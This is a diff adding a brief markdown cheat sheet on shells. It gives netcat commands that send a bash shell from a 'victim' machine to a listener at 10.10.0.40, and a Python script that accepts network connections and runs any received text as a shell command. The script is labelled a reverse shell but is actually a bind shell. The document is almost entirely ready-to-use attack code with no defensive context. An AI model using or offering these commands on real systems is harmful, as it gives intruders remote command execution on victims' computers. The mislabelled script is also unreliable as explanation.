@@ -1,0 +1,35 @@
+# Reverse Shells using nc 
+```
+First listen for the shell on your device.
+$ nc -lvp 9999
+
+On Victim using -c :
+nc -c /bin/bash 10.10.0.40 9999
+or
+On Victim using -e :
+nc -e /bin/bash 10.10.0.40 9999
+```
+## Reverse Shell with python
+```
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+```
